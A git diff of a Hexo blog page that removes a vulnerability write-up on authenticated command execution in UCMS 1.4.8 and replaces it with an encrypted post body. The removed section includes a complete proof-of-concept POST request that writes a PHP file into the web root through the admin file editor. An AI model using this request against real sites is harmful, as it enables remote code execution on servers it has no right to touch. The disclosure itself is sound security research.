@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -20,25 +20,18 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="UCMS v.1.4.8 Command execution Vulnerability Type : Command execution Vulnerability Version : 1.4.8 Recurring environment:  Windows 10 PHP 5.4.5 Apache 2.4.23">
+<meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;UCMS v.1.4.8 Command execution&#39;">
 <meta property="og:url" content="https://sunian19.github.io/2021/11/12/UCMS%20v.1.4.8%20Command%20execution/index.html">
 <meta property="og:site_name" content="zer0_c|imb&#39;s blog">
-<meta property="og:description" content="UCMS v.1.4.8 Command execution Vulnerability Type : Command execution Vulnerability Version : 1.4.8 Recurring environment:  Windows 10 PHP 5.4.5 Apache 2.4.23">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i44.png">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i45.png">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i46.png">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i47.png">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i48.png">
-<meta property="og:image" content="https://sunian19.github.io/imgss/i49.png">
-<meta property="article:published_time" content="2021-11-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-29T02:55:36.846Z">
+<meta property="article:published_time" content="2021-11-12T08:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-18T17:14:45.718Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="CVE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sunian19.github.io/imgss/i44.png">
 
 
 <link rel="canonical" href="https://sunian19.github.io/2021/11/12/UCMS%20v.1.4.8%20Command%20execution/">
@@ -143,7 +136,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -156,7 +149,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ucms-v-1-4-8-command-execution"><span class="nav-number">1.</span> <span class="nav-text">UCMS v.1.4.8 Command execution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-type"><span class="nav-number">1.1.</span> <span class="nav-text">Vulnerability Type :</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-version"><span class="nav-number">1.2.</span> <span class="nav-text">Vulnerability Version :</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#recurring-environment"><span class="nav-number">1.3.</span> <span class="nav-text">Recurring environment:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-description-and-recurrence"><span class="nav-number">1.4.</span> <span class="nav-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -171,7 +163,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -182,7 +174,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -278,14 +270,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2021-11-12 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-12T00:00:00+08:00">2021-11-12</time>
+      <time title="创建时间：2021-11-12 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-12T00:00:00-08:00">2021-11-12</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-09-29 10:55:36" itemprop="dateModified" datetime="2022-09-29T10:55:36+08:00">2022-09-29</time>
+        <time title="修改时间：2024-01-18 09:14:45" itemprop="dateModified" datetime="2024-01-18T09:14:45-08:00">2024-01-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -315,34 +307,18 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="ucms-v-1-4-8-command-execution">UCMS v.1.4.8 Command execution</h1>
-<h2 id="vulnerability-type" id="Vulnerability-Type">Vulnerability Type :</h2>
-<p>Command execution</p>
-<h2 id="vulnerability-version" id="Vulnerability-Version">Vulnerability Version :</h2>
-<p>1.4.8</p>
-<h2 id="recurring-environment" id="Recurring-environment">Recurring environment:</h2>
-<ul>
-<li>Windows 10</li>
-<li>PHP 5.4.5</li>
-<li>Apache 2.4.23</li>
-</ul>
-<a id="more"></a>
-<h2 id="vulnerability-description-and-recurrence" id="Vulnerability-Description-AND-recurrence">Vulnerability Description AND recurrence:</h2>
-<p>1、The current version is V1.4.8<br>
-<img src="/imgss/i44.png" alt=""></p>
-<p>2、Using the keyword search, I found the fopen() function in the \UCMS \UCMS \sadmin\fileedit.php file, where there are no restrictions on the filename suffix and content to write! So the PHP suffix can be written here to cause malicious command execution!</p>
-<p><img src="/imgss/i45.png" alt=""></p>
-<p>3、Here I backtrace, first $_POST[‘co’] exists, then $_GET[‘file’]) exists, and $_GET[‘dir’] exists. Most of all! In the first line of the file, we determine if there is a global variable admin. In this case, we can’t do anything without authorization, we just have to look up where is the entry</p>
-<p><img src="/imgss/i46.png" alt=""></p>
-<p>4、The current file is under/UCMS/UCMS. This is the background file. And all the data can be found through the background operation route/UCMS /index.php hole. Go to/UCMS /index.php here</p>
-<p><img src="/imgss/i47.png" alt=""></p>
-<p>5、And you can actually see that right here, it’s included by requiring something here. For analysis here, GET type parameters do and NOHTML need to be passed. And split $<em>GET[‘do’] with '</em>’ as the divider. The first part is included as the name of the folder, and the second part is included as the file name +‘.php’.</p>
-<p>6、So the idea here is pretty clear, the vulnerability file is fileedit.php and it’s under sadmin, so $_GET[‘do’] is sadmin_fileEdit. This satisfies the criteria to enter the fileEdit file, at which point you only need to satisfy the criteria in Fileedit.php. Here the POST package is as follows:</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ucms&#x2F;index.php?do&#x3D;sadmin_fileedit&amp;dir&#x3D;&#x2F;&amp;file&#x3D;CNVD.php HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: www.ucms.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line"></span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http:&#x2F;&#x2F;www.ucms.com&#x2F;ucms&#x2F;index.php?do&#x3D;sadmin_fileedit&amp;dir&#x3D;&#x2F;&amp;file&#x3D;phpinfo.php</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: admin_bea161&#x3D;admin; psw_bea161&#x3D;b68feda37b0dafd462839833718a00f1; token_bea161&#x3D;67d4ad96; </span><br><span class="line">__gads&#x3D;ID&#x3D;58ee293cb8d9d291:T&#x3D;1597928570:S&#x3D;ALNI_MYq2qd7T2fr328CCX4HfMAkMWtFzw</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuu_token&#x3D;67d4ad96&amp;co&#x3D;&lt;?php phpinfo()?&gt;&amp;pos&#x3D;6</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/i48.png" alt=""></p>
-<p>7、Here our Webshell phpInfo is in cnVd.php in the root directory</p>
-<p><img src="/imgss/i49.png" alt=""></p>
-
+        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="0df6b3c8ad51931fad9311219b5252c73d85b4dff65e855e6cdf59ef9471102f">3e1fc8a27e41957f3600324ac6d113cfcc33d7c3274cbdd1fb4c6a7af17ff4181f7bc2d6d635388adf139d19820d540d870e21c296dacd2684cb1c3e6e9724af84333cc105810ca79120a216a62447fee36a059dc9113ebc05ef303d88079fd76b157be74d2c443d37162f20e70a7f4c83d5d2cb13dcd6439238fc4351e614ea4be12c1443d52d02edde093c584f75855d660928384fe01ba9ffe674f60dba73e0a5d55efb7e5e916c006cc239384a1587dc81c79a0ca02ae3c89e8a895d93f6690d85e187b3f2ecd0095ebf7a7732977314df1717a03cad16d944bed8c4c6769bdc9a8cb12ad0b57e6af5e3bc98eba93ac1fe24cf80799deb6f396ac97580aa3791903bb5637547201ed773a412dea5f4c61ad581bd0746b1bfecbacc58fd2319b3c551b9c1d03f83120675244450d7b2ea9a83ee5584d96fecf393393a4a90d47d34ca590caffbed97171a416c7d4549272c4486fafd26fb98e395e2925eecf59e66ecec75169546b03005e9f401b3d846aec247a10de85981721ee09a481e3254efd37a7baea4a8ebdd5ec441528767c44f2b1467072cbbe88ccb2dbe220f36eb3069f8895627c02a15d8d39036169f52cd2e7b3ff1f67483f1bdf78f540168243612ea657ffd9e687b883ce2d46a3b21fe2e38abd259aa1bde5e6d8458cb0d287aba946e62d40cb0cd55e4001bed48169ad9175c9bf4a3647fba1b8a63258b5a7ee40cd57f2557c808ae8c66fe5e36dcaaf5d3ecefff4d00bddb562610732fe5e79d11a6d3c4551674ed8fdf7326916772fd5b0fb3ab304029e054099e5b5c6cab73761cd88e35e890ebf91cba8c42cd126bd8e5a0730a92484a4b2deb0dfeb83ac4b952422be981ca6ce0098709abda89c7505377541de2be0dd215ad02e3a4f3edd0f91152a64615ba9f7eb15d1d9b841eb435d8d1d93c31c8a7f7bdc8f10775b69ae956bfa3e9a0c4b088953cf7bbaa77245e70c32548619e7b237a8e6f036cc4b58563c45d324c936e9761e0496145d8788459e1156bdf356b03d946d34685594def0c46ebbc2550668cfe569eb5931e887cb8d9bd57cdadae450f86b18a157c69bf5c88ea1dc1dd38a3c42edd6de1f2ab65738ed5e044f585d4aef5b751888385ebb41ee505da1210502642ede2ac0474a7c8ada465aff7625bf1b7a38a640422702a02efb1db84bf56127942add79c32737dc4919beb22b6f6f15e78bbaf428385746a033ec152fa55a6a253ae4cd04ee532bec0a7b9cc1e8159034f3c7e741af839091d8fdfae771d58b03084946281d9d77f357b559118a4c1716f48416a8e33f4b6cc1d5e38e7c7ff7385cfa0dfcb9811dbe7b1db73692d0f12950cf033efe6dc7f88c1390a427ed0789537b161d39b72e7ba771a2ad4ea22eebed0c863e65082323e10f005f16166fb1efd69910aa1b49980701e4738d4960a8489c183e27a560903a79c9947af446ae878fa5ce7bc0657d66c3584ab0610a6b5d31caea959545e167d5490612a0aca92a390e1a8c903a5dedafa2ad2df3a0b7bc3d628041353a5d89a89bfa7e3745fd6db01d83d7472273655789927f203352529b963a2a7e9901ac9520e88473bfe8d4d89151a1b83f5cbb6564cfcd5e7f6139762824cba6bed542f4d7056329dde3b515f391228110f1866e0133308cd5d7a8c8b7fcbfa346104b8065658ea4f82d84376cd3a01501d90c14d41bbd4908bb556d21a03b884f99d0be42c22ecce62c298c581cca8730139538c9ac160e2e6f50607e47b1aab8005042f66b6671f89b9ae193338396a2481e9dbab1d346b24d6f1b7d8bf2f7ac7dea08001c00169fc6fc033e45510bf849410ae3a936f42c728e30ada8556b0619e91137d5438f2aba3fad6a27d5faf1e1d76a87efd349a6041d37f1d862f89e43618e316b9df3f9f4d2ba0f457540897a409344925fde864f93c91889c477b71625ffd239867647d1eeeb17d32f4a064e7abf43c07f007753fdd266edcc70fb1590b95b6840aae4aa44742ba0a5a848c1dcd6257e3464b509a711c5f64d324eda10d1231517289d286e2bcce838335dc6fdf98010ebfbe6aa10a977f9c8ae4a1284a5ec1806dee0c6e0157765fcf7fbf7ff076dcd638ddc1e03c824dc5d67aadf179763222158d17571849f9d674e5a24f3fbdeabee6193698c1aa1eb52e296b05edc582e0e441ab21e3fc2ccbd49dcc3ab5aac2c37ed18c1a68702f99237bcbded8cd97e726a4192e8963a7b0b3793df31575fbf16c4a92a3f202e7ce249f098caa4ba9aceeb064b7b74153979b4db07dec1f0b759de2ecf2e4194f97dd9237d414c2687b034169976816f8bac3d9afd76de53f58771fd2fe0d15860d4a201391a05f665ce7a540234b7b098e2e4bc6baef784abf9662324b014bab56a6dcbe41b83a2548dff3501b40de9dadd499b1a3747483f156ed66343fb0ecb269d4bd1648ddadd4f6a43a4949bb0b9b0fc8b7044dff6a232f8fc97a661caa78beb883fb2880b41dbb33151da74242c071c0167e061311ba7296980c21dc3784b8010677b9aebcd809bee2012bf518a0960653fa1a411757302d9f70ddb95f6a7b685491eff9e8c0d795487151e834c17a86951db663eee96df73e24027a63f0231095afef33da5f6314eae819c2c2f36a7085e748776c04b0e39efa202c8d981bce3089f5b7775d7777e1f08976e8ce4edbb33f8f763db3810db31423041bbfcc025b04f8946ad6ebae3009fd6823836d33e6be0ef7fdba0704c5c5b671d3f803640df4235dbc14f5440211d612a450b8796c652442638f80979733431f1cdb97c31921fa243fa51d4ce2e52aa6c46ec2248a6961ccb701acdf97bee127f42df843938a5533157f6d18e28f9057fd3fcf696f90e3bc151a73543524e5f4387f1efc2388101f29e7a5ba74fd36c74954dd686e3d7e15db9380fc7092d73e8cb7cc46b64e7da60b537ea1de4c557e221eb335445091d953835be78fb42ff5150b9b80280ea0cb191db6991c1b2c43db0d0c37277a8fa38f5c93080e2f095014c0c989ee9b291354b2eab32530ced804b486a85e40a32dc167052cd00abf22308220608b901c41f9155aa85f09197da1902fbe45b74ee43f5a1b718c3a8e0175a367c0bd4dd8060caf09076c2f799a1ff3004643ac7e1b2511282b00f82c99c78be579fd319c9e195d43bbd8d352e8f162e15aab10b3de1472b128f7c441d7258ae601492e4ed6e597f2b9e1389c7f811b5acf43fa1b7a613d277fba3dba8789f4bc5e4476ada9c00e7a7df32bfb50389cccfcb7f5b3d0c2347c2895eb46367c1700603a81df041248d5c132b74bb8f4072b3ca81b86f335c9df7ed5b40da6b787ca4eb2c72a8bfdb076b2a8a0b636b0d9b2ff63b391e20349e326c6c69d62b80934824e74044920e37402b7800c841b5bfff6a2c24e4d7f684ed15ec53a3a804da8d6269c9e75304794df3a5ad16d1aa06221b223fcd7cb3a77ec10a9bbb9aa3f1ec40fb789eb4e5d42a1acaebd3b0517f1b3e7e494c19d5b7ff44b22580e23bd58b5a4d83fa4b3d9524aecc449de180ee35b4af6f8f2c7f58699d7b55eb62efd5a0fa197f57b397e49a90a22862d13497914abc32914134f674397cfaf28db5d2fab06329748a7359a24ea72ba3ff62550f7085fa00cb291623d6e1c600b62e6cfbf7d64ffae4ee1df771539aade31257ca4451be8e2eef61d051f43f4c10645d4fad75acd4552bbcaf6096d1890cd77704d6476715ce125f47a1a4234d64914ca55473e522c1db377db50eda1dedc0d8f30316244ed3646d7476c5047be0b22bb6a57aac20aaf78a76592b586499e8acedf442690178e482255b0a4479ce04931aa81410d9cd0f43452eabbd589074c4c822a625a7601419fc19e97fe41349a1e274b5146c44d45ee64e81bdf608cf7f89b8c48860ac3f4a22aa3d82e85f1875d7e02add6e930510e344018e1002d20bfc1d332b3c93c3d5d0682aa27333468b065ba36062b2c8d15fd1b94de1bd1f0afb8955b494fabd43e57cc46e4cf6ceba9ceb6453eab0caddeb96e6129233bfb5aef3b6e8f53f3674b6c3aad74f815942c033fd4f9ae9590e6b3721f32d326eb0f47c2fbf27afb9aa43e8815a4c44a8eb0002dc68a520504ee19462f3c1c2ce987d0e5232b7d3f0c59e3f678e7be1d54596e91699e641e6d95e6fdcdb36d67d8d5e0ae324b9d78c64fc4556b2e852954bd9d57a1b4c7f2ffaad6abd91cd8fcf243ebc58753ef7d72fa08f9a0f8f737f713c9190a195d35f7b00c2a1eddde077a34843b5b1fcfacef00973994715ed9ad7fec628603ed666e3dc95582a66140416728b823f5f715355ae63b6ce7c4f00f57c4aaf1f6e013745da1b15eacd5793497a81ea9a477bd6d9037e7d2420079e0d121121ea5d1216a2a813b648dbb37bec5a1ed961da8673eda8df9cf59ebcdc90187c56dc6a05afa924befaea0d02d9988a3f85d59ee606240e5ef23d7c1f9e8e8cd8689eb2bfeef868a5c7208ac20f60b2b86fca55aa9ca9f11de042025123c7227389f5393b147a6977dd87825b2fb7a3fc10e41c45426e9d55a6a79b5f7b8e2bca18b5fcee395984542c82019102cf4566b5032e6389194964cdb846d7cff58fe16bf7df0542f798c792fea2f111ab5be3399c906fc507bc1ca16f08ae8e43a1a90557b3e814b5686b052d7d68fc41fa74fd26dd048e152b5e23fca039ce9994403d43c64f19496f49680ae8fd7c96f5ba340941015cfd9aacf87b289d382f87ca07d92bde98dcda6692d443a0523e31250a6115cd8ced7c6454e6c020ef54215f31d5dc4047489f2128fac81f0ceeea96c1969ed22fa52b0e60108876ce4341532a0ddc43fd9f587de2ffb6be061a059de24745b5676e038cdfee0e135ff0d61ce48652cef7d9c77f1b75082e93a48b9b3afa92c1489ad1f0ec1b334628c5305ccd75c80edb7eebcf8adad721f1da4827ea104cd175f51802e8415497fd1140565a062d64d641cd6d25f17865cdcf7393faf9103dc9a18923fe71320edf8f9f356b407ba7298cabfc7ab672be3fe0283e41b4a44685bc7a1cc757ce4b8501e4b87039ac176171c0a7c6c78d404cd77493c0e547ebd1e44ee94ba724e9e5333372ceb92f09a2d26375802963d03d79fa305dc0c3da2318223a1dd9a90f35dbb129996275edf22492d7e86907ac3e4032c500620b90d8764a965140f21d6b73cbf86f8e4bfacde0f98f5ecd55029ae19b95b0f75c3bf47118d421e1ca671dd633b5f658af3344bceba4b216c50c3d1d4eff5b4a8bebdebbee3979569bd03077218f135251876bdc61070bcc8eac250225878bd492bad2bdfd0eea1780c20a31691ad574297a5c49e85637d3310a1accbb91f2930fe8870d7de436845758b9336d33a9500529cabe489ca44190983d545e867b107a1692eedb0c4ee32ffab2e3cf65cf5e05edd9ddc317fc9cf1c58e5020f5d5741ab8308b7b4a1cc94e82062a4ad26c967b74b07b3dd423b631801ffc506afc26d234291d1d0c9d0891bb77c9ecc437e100e31204bb0db02bfd59e0bd8398791794c9ce17743377a9fb2c4e01fc7d5d652d65d8394efac013847667f9ea7799442579ba91d642e0d9a9089be89c75749be2cb63802a1540ac51706e8ae83c234b4ed796b7e2a3dab5f45a5387b0c04dd3fe32a791a3e75768bf7102a82ad5a4507222fd140bf51b6adb35aacaba2c35d8a1e8b69ed477ad7537a429400b08f12427914af09734cc3c84c2eb5c66fa70dae3db72711d53ecf5555e1cfe5008b758588f9fc4032172893bf6e52eff5a9c754f96f0b025604f3c58b63ee42066ad77fedd3dda43f7a82ee62a81337daec51218ca367b7aa766f90e686e8b114d823907d4152d6385e05155d1c0eadd8a055f637bfc7e8bda5a2c3f1278bd737959bc6a630bd1df7539b158e0d4ed6ff96e6e8c5396e2756709144457efff150c9b224d8b4e61b8ed722035389b5e0a2f321c375d5de2f9fcf425686f03f296b5bd5594b352c29d913f221ed947a65379a0ffedbb295e8799894f6ea87ef324b7c00c24c98ba2a1a24423ea366cd36522f4fbace4ce4fe586c77ee4535c505650d6a369819c938002a3984b3fbabf8937265d76b35d07add1e92bda027a48ec57038478806ef0800559ca97db15e47a947d402a4d2a57691bd137cb70f5996aa7971afe26f288cd7d1da0dceb12d5caa14d22eec13b0af2985828bdb62e3b4db87291a3713ef9ea2cd46a2b6ad93118efa85012a439ecdcd59e9fa89d4f8df1751117ab6d1383187b12f82f0f7cd2dec15a1cc922465ca07b3b204ae9552b9014323f1b8ef4f4e336acbe07dad4a06ea69630b878d0d2332d4c656c4718e0d8ed5651dadc30708e17ab39834a73d1e3435d0ad8a5020bd72d6c2d8cc92f35e10d9bf85ef961cb2809d4be50b5712d73a4db28a1719b3ffc33303dcfd3b9d17a481f9d6041fcd1058f3888878b0418ed94e34f7fac9dcc1166e667efebb63283a90f8077a5a9b9b864bdef6acba8b356d529e10aa9e5442e3bdb773768756906de0ff2606a6f358cd7607a99e55c9f03647e9627292004ab6f5ebda2f72a4172f0b08725f2413ad9437ba1f29995f2dfaa997bf11afd16145d081b5c6fbc6b786ed1692106f159f8e3ca7072447a5cedc1228e9cffa4cbf20bf74e81e09f26dbd1cb65c7320886e5b7b6c6aefa15c69290a84d2c24215b7cbcd64fa3e8e0303e1fcefe57570ba01a3687498aecf4ccebf88959e984f91590b0cc800d6da44f983cee326929bbdcc48c736ffce3271674babd66a953d6fb949f50ab14ee3e527ac9e7c81eee67afe645691615677413d50408724833eb3b0fe115c076d08dbcd6fa70267e115de6bfec6bae3c7899970c80e3c1764d49130845b26d405025748e65cc01e8176583d19571bfa506ebdbfd42fbe2efa85c2d70d4850ee493414fb6d272cb5f09dada8a67904bce61c9f95d2be18d799e2d9e729561c99a0f4b780a7c4b59dafcba204bb1625f28cfd64c1b88f534e96cace462a26f879fe5c419c811a3d6b52d162604a4852681d0f3e2b0787e486c8efe1105aff09c64affa39ed0d146431d544d00098846c5087e9e7ec033e33929807351a930acd4998aa87a299e15b0b4d0236aaac54b51bdfe88d9c88c338e638bb1cc770aa7a2082312e85fca099503f320b93548f586fddd8fb9c31959f28036f6b7fa4a39335ea3275a7ade5840288a891059be13565028013ea33db481355500448dc1b0ef04a6dfbadb82c0a022c25efe55572fba8ed399c0da4c82dc1479addd499c523b12602bd90a3b5f32bf303ce1363f8e453fa8c4ffa5abf60a8443848e3310855353aef47cf7a9f72d57aa6dc0d3905468c61289de93b99f01b4349f3fa78d5760466c6e3be3e4a42ee5a302fb22eecd191ea97ff3fca6944c67cd2353bbf4dd907407a64afffdbbb01d70b323bcf7</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -386,7 +362,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
